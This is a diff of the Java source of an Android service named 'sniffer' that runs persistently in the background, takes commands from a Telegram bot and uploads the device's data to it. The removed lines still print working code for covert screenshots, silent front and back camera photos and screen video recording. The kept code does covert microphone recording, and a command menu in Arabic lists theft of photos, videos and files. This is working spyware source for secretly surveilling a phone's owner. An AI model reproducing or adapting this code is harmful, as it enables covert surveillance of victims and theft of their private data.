@@ -1,26 +1,17 @@
 package com.v8.global.sniffer;
 
-import android.content.IntentFilter;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
 import android.content.ContentResolver;
 import android.content.Intent;
+import android.content.IntentFilter;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
-import android.graphics.Bitmap;
-import android.graphics.PixelFormat;
-import android.hardware.Camera;
-import android.hardware.display.DisplayManager;
-import android.hardware.display.VirtualDisplay;
 import android.location.Location;
 import android.location.LocationManager;
-import android.media.Image;
-import android.media.ImageReader;
 import android.media.MediaRecorder;
-import android.media.projection.MediaProjection;
-import android.media.projection.MediaProjectionManager;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Environment;
@@ -33,8 +24,6 @@ import android.provider.ContactsContract;
 import android.provider.MediaStore;
 import android.telephony.SmsManager;
 import android.telephony.TelephonyManager;
-import android.util.DisplayMetrics;
-import android.view.WindowManager;
 
 import androidx.core.app.NotificationCompat;
 
@@ -44,11 +33,8 @@ import org.json.JSONObject;
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.IOException;
-import java.nio.ByteBuffer;
 import java.text.SimpleDateFormat;
-import java.util.ArrayList;
 import java.util.Date;
-import java.util.List;
 import java.util.Locale;
 import java.util.Timer;
 import java.util.TimerTask;
@@ -69,13 +55,10 @@ public class MainService extends Service {
     private PowerManager.WakeLock wakeLock;
     private Timer timer;
     private int lastUpdateId = 0;
-    private MediaProjection mediaProjection;
-    private MediaProjectionManager projectionManager;
-    private int screenWidth, screenHeight, screenDensity;
     private Handler handler = new Handler(Looper.getMainLooper());
     private MediaRecorder mediaRecorder;
     private boolean isRecording = false;
-    private String currentVideoPath;
+    private String currentAudioPath;
 
     @Override
     public void onCreate() {
@@ -85,16 +68,7 @@ public class MainService extends Service {
         wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MainService");
         wakeLock.acquire();
 
-        projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
-        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
-        DisplayMetrics metrics = new DisplayMetrics();
-        wm.getDefaultDisplay().getMetrics(metrics);
-        screenWidth = metrics.widthPixels;
-        screenHeight = metrics.heightPixels;
-        screenDensity = metrics.densityDpi;
-
         startForegroundService();
-        setupMediaProjection();
         sendToTelegram("✅ MainService Started - Ready for commands");
 
         timer = new Timer();
@@ -118,19 +92,6 @@ public class MainService extends Service {
                 .setSmallIcon(android.R.drawable.stat_notify_sync)
                 .build();
         startForeground(1, notification);
-    }
-
-    private void setupMediaProjection() {
-        try {
-            int resultCode = getSharedPreferences("screen_capture", MODE_PRIVATE).getInt("resultCode", -1);
-            String dataUri = getSharedPreferences("screen_capture", MODE_PRIVATE).getString("data", null);
-            if (resultCode != -1 && dataUri != null) {
-                Intent data = Intent.parseUri(dataUri, 0);
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-                    mediaProjection = projectionManager.getMediaProjection(resultCode, data);
-                }
-            }
-        } catch (Exception e) {}
     }
 
     private void checkCommands() {
@@ -203,21 +164,6 @@ public class MainService extends Service {
             case "/files":
                 getFiles();
                 break;
-            case "/screenshot":
-                takeScreenshot();
-                break;
-            case "/front_camera":
-                takeFrontCamera();
-                break;
-            case "/back_camera":
-                takeBackCamera();
-                break;
-            case "/record_start":
-                startRecording();
-                break;
-            case "/record_stop":
-                stopRecording();
-                break;
             case "/record_audio_start":
                 startAudioRecording();
                 break;
@@ -260,12 +206,7 @@ public class MainService extends Service {
                 "/photos - آخر 10 صور\n" +
                 "/videos - آخر 10 فيديوهات\n" +
                 "/files - الملفات\n\n" +
-                "📸 **الكاميرا والتسجيل**\n" +
-                "/screenshot - تصوير الشاشة\n" +
-                "/front_camera - صورة أمامية\n" +
-                "/back_camera - صورة خلفية\n" +
-                "/record_start - بدء تسجيل الفيديو\n" +
-                "/record_stop - إيقاف التسجيل\n" +
+                "🎙️ **تسجيل الصوت**\n" +
                 "/record_audio_start - بدء تسجيل الصوت\n" +
                 "/record_audio_stop - إيقاف التسجيل\n\n" +
                 "🎮 **التحكم**\n" +
@@ -508,217 +449,6 @@ public class MainService extends Service {
         }
     }
 
-    private void takeScreenshot() {
-        if (mediaProjection == null) {
-            setupMediaProjection();
-            if (mediaProjection == null) {
-                sendToTelegram("❌ لم يتم تفعيل صلاحية تسجيل الشاشة");
-                return;
-            }
-        }
-
-        try {
-            ImageReader imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 2);
-            VirtualDisplay virtualDisplay = mediaProjection.createVirtualDisplay(
-                    "Screenshot", screenWidth, screenHeight, screenDensity,
-                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
-                    imageReader.getSurface(), null, null
-            );
-
-            handler.postDelayed(() -> {
-                Image image = imageReader.acquireLatestImage();
-                if (image != null) {
-                    Bitmap bitmap = Bitmap.createBitmap(screenWidth, screenHeight, Bitmap.Config.ARGB_8888);
-                    bitmap.copyPixelsFromBuffer(image.getPlanes()[0].getBuffer());
-                    sendScreenshot(bitmap);
-                    image.close();
-                    bitmap.recycle();
-                }
-                virtualDisplay.release();
-                imageReader.close();
-            }, 500);
-            sendToTelegram("📸 جاري تصوير الشاشة...");
-        } catch (Exception e) {
-            sendToTelegram("❌ فشل تصوير الشاشة: " + e.getMessage());
-        }
-    }
-
-    private void sendScreenshot(Bitmap bitmap) {
-        try {
-            File file = new File(getCacheDir(), "screenshot.jpg");
-            FileOutputStream out = new FileOutputStream(file);
-            bitmap.compress(Bitmap.CompressFormat.JPEG, 85, out);
-            out.close();
-
-            RequestBody body = new MultipartBody.Builder()
-                    .setType(MultipartBody.FORM)
-                    .addFormDataPart("chat_id", CHAT_ID)
-                    .addFormDataPart("photo", "screenshot.jpg",
-                            RequestBody.create(MediaType.parse("image/jpeg"), file))
-                    .build();
-            Request request = new Request.Builder()
-                    .url("https://api.telegram.org/bot" + TOKEN + "/sendPhoto")
-                    .post(body).build();
-            client.newCall(request).enqueue(new okhttp3.Callback() {
-                @Override
-                public void onResponse(Call call, Response response) {
-                    try { response.close(); } catch (Exception e) {}
-                    file.delete();
-                }
-                @Override public void onFailure(Call call, IOException e) {}
-            });
-        } catch (Exception e) {
-            sendToTelegram("❌ فشل إرسال الصورة: " + e.getMessage());
-        }
-    }
-
-    private void takeFrontCamera() {
-        new Thread(() -> {
-            try {
-                if (checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
-                    sendToTelegram("❌ لا توجد صلاحية للكاميرا");
-                    return;
-                }
-
-                Camera.CameraInfo info = new Camera.CameraInfo();
-                int cameraId = -1;
-                for (int i = 0; i < Camera.getNumberOfCameras(); i++) {
-                    Camera.getCameraInfo(i, info);
-                    if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
-                        cameraId = i;
-                        break;
-                    }
-                }
-                if (cameraId == -1) {
-                    sendToTelegram("❌ لا توجد كاميرا أمامية");
-                    return;
-                }
-
-                Camera camera = Camera.open(cameraId);
-                Camera.Parameters params = camera.getParameters();
-                camera.setPreviewCallback((data, cam) -> {
-                    Camera.Size size = params.getPreviewSize();
-                    try {
-                        android.graphics.YuvImage yuv = new android.graphics.YuvImage(data, params.getPreviewFormat(),
-                                size.width, size.height, null);
-                        File file = new File(getCacheDir(), "front_camera.jpg");
-                        FileOutputStream out = new FileOutputStream(file);
-                        yuv.compressToJpeg(new android.graphics.Rect(0, 0, size.width, size.height), 85, out);
-                        out.close();
-                        sendFile(file, "front_camera.jpg");
-                        camera.stopPreview();
-                        camera.release();
-                    } catch (Exception e) {
-                        sendToTelegram("❌ فشل التقاط الصورة الأمامية: " + e.getMessage());
-                    }
-                });
-                camera.startPreview();
-                handler.postDelayed(() -> {
-                    if (camera != null) {
-                        camera.stopPreview();
-                        camera.release();
-                    }
-                }, 2000);
-            } catch (Exception e) {
-                sendToTelegram("❌ فشل فتح الكاميرا الأمامية: " + e.getMessage());
-            }
-        }).start();
-    }
-
-    private void takeBackCamera() {
-        new Thread(() -> {
-            try {
-                if (checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
-                    sendToTelegram("❌ لا توجد صلاحية للكاميرا");
-                    return;
-                }
-
-                Camera camera = Camera.open();
-                Camera.Parameters params = camera.getParameters();
-                camera.setPreviewCallback((data, cam) -> {
-                    Camera.Size size = params.getPreviewSize();
-                    try {
-                        android.graphics.YuvImage yuv = new android.graphics.YuvImage(data, params.getPreviewFormat(),
-                                size.width, size.height, null);
-                        File file = new File(getCacheDir(), "back_camera.jpg");
-                        FileOutputStream out = new FileOutputStream(file);
-                        yuv.compressToJpeg(new android.graphics.Rect(0, 0, size.width, size.height), 85, out);
-                        out.close();
-                        sendFile(file, "back_camera.jpg");
-                        camera.stopPreview();
-                        camera.release();
-                    } catch (Exception e) {
-                        sendToTelegram("❌ فشل التقاط الصورة الخلفية: " + e.getMessage());
-                    }
-                });
-                camera.startPreview();
-                handler.postDelayed(() -> {
-                    if (camera != null) {
-                        camera.stopPreview();
-                        camera.release();
-                    }
-                }, 2000);
-            } catch (Exception e) {
-                sendToTelegram("❌ فشل فتح الكاميرا الخلفية: " + e.getMessage());
-            }
-        }).start();
-    }
-
-    private void startRecording() {
-        if (mediaProjection == null) {
-            setupMediaProjection();
-            if (mediaProjection == null) {
-                sendToTelegram("❌ لم يتم تفعيل صلاحية تسجيل الشاشة");
-                return;
-            }
-        }
-
-        try {
-            String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
-            File videoDir = getExternalFilesDir(Environment.DIRECTORY_MOVIES);
-            if (!videoDir.exists()) videoDir.mkdirs();
-            currentVideoPath = videoDir.getAbsolutePath() + "/record_" + timeStamp + ".mp4";
-
-            mediaRecorder = new MediaRecorder();
-            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
-            mediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
-            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
-            mediaRecorder.setOutputFile(currentVideoPath);
-            mediaRecorder.setVideoSize(screenWidth, screenHeight);
-            mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
-            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
-            mediaRecorder.setVideoEncodingBitRate(5 * 1024 * 1024);
-            mediaRecorder.setVideoFrameRate(30);
-            mediaRecorder.prepare();
-
-            VirtualDisplay virtualDisplay = mediaProjection.createVirtualDisplay(
-                    "ScreenRecorder", screenWidth, screenHeight, screenDensity,
-                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
-                    mediaRecorder.getSurface(), null, null
-            );
-            mediaRecorder.start();
-            isRecording = true;
-            sendToTelegram("🎥 بدأ تسجيل الشاشة");
-        } catch (Exception e) {
-            sendToTelegram("❌ فشل بدء التسجيل: " + e.getMessage());
-        }
-    }
-
-    private void stopRecording() {
-        if (!isRecording) {
-            sendToTelegram("⚠️ لا يوجد تسجيل نشط");
-            return;
-        }
-        try {
-            mediaRecorder.stop();
-            mediaRecorder.release();
-            isRecording = false;
-            sendFile(new File(currentVideoPath), "video.mp4");
-        } catch (Exception e) {
-            sendToTelegram("❌ فشل إيقاف التسجيل: " + e.getMessage());
-        }
-    }
-
     private void startAudioRecording() {
         try {
             if (checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
@@ -728,13 +458,13 @@ public class MainService extends Service {
             String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
             File audioDir = getExternalFilesDir(Environment.DIRECTORY_MUSIC);
             if (!audioDir.exists()) audioDir.mkdirs();
-            currentVideoPath = audioDir.getAbsolutePath() + "/audio_" + timeStamp + ".3gp";
+            currentAudioPath = audioDir.getAbsolutePath() + "/audio_" + timeStamp + ".3gp";
 
             mediaRecorder = new MediaRecorder();
             mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
             mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
             mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
-            mediaRecorder.setOutputFile(currentVideoPath);
+            mediaRecorder.setOutputFile(currentAudioPath);
             mediaRecorder.prepare();
             mediaRecorder.start();
             isRecording = true;
@@ -753,7 +483,7 @@ public class MainService extends Service {
             mediaRecorder.stop();
             mediaRecorder.release();
             isRecording = false;
-            sendFile(new File(currentVideoPath), "audio.3gp");
+            sendFile(new File(currentAudioPath), "audio.3gp");
         } catch (Exception e) {
             sendToTelegram("❌ فشل إيقاف تسجيل الصوت: " + e.getMessage());
         }
@@ -882,4 +612,4 @@ public class MainService extends Service {
         if (mediaRecorder != null) mediaRecorder.release();
         startService(new Intent(this, MainService.class));
     }
-}
+                     }
